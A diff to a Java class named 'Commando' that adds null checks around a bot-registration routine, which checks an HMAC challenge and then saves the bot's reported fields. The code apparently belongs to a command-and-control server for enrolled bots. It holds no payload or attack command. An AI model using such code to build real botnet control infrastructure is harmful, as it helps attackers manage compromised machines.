@@ -8,6 +8,7 @@ import java.security.PublicKey;
 import java.security.SecureRandom;
 import java.security.SignatureException;
 import java.util.ArrayList;
+import java.util.HashMap;
 import java.util.List;
 import java.util.Random;
 
@@ -114,20 +115,28 @@ public class Commando {
 		String response = "";
 		String idBot = objects.get(0).toString();
 		String hashMac = objects.get(7).toString();
-		Long keyNumber = auth.getBotSeed().get(idBot).getValue1();
-		Integer iterationNumber = auth.getBotSeed().get(idBot).getValue2();
-		if (auth.findBotChallengeInfo(idBot)) {
-			if (auth.validateHmac(keyNumber, iterationNumber, hashMac)) {
-				response = "Challenge OK";
-				objects.forEach(obj -> System.out.println("obj: " + obj.toString()));
-				Bot bot;
-				bot = new Bot(objects.get(0).toString(), objects.get(1).toString(), objects.get(2).toString(),
-						objects.get(3).toString(), objects.get(4).toString(), objects.get(5).toString(),
-						objects.get(6).toString(), objects.get(8).toString(), objects.get(9).toString());
-				bServ.save(bot);
+		HashMap<String, Pairs<Long, Integer>> lista = auth.getBotSeed();
+
+		if (lista != null) {
+			Pairs<Long, Integer> coppia = lista.get(idBot);
+			if (coppia != null) {
+				Long keyNumber = coppia.getValue1();
+				Integer iterationNumber = auth.getBotSeed().get(idBot).getValue2();
+				if (auth.findBotChallengeInfo(idBot)) {
+					if (auth.validateHmac(keyNumber, iterationNumber, hashMac)) {
+						response = "Challenge OK";
+						objects.forEach(obj -> System.out.println("obj: " + obj.toString()));
+						Bot bot;
+						bot = new Bot(objects.get(0).toString(), objects.get(1).toString(), objects.get(2).toString(),
+								objects.get(3).toString(), objects.get(4).toString(), objects.get(5).toString(),
+								objects.get(6).toString(), objects.get(8).toString(), objects.get(9).toString());
+						bServ.save(bot);
+					}
+				}
 			}
 		}
 		return response;
+
 	}
 
 	/**
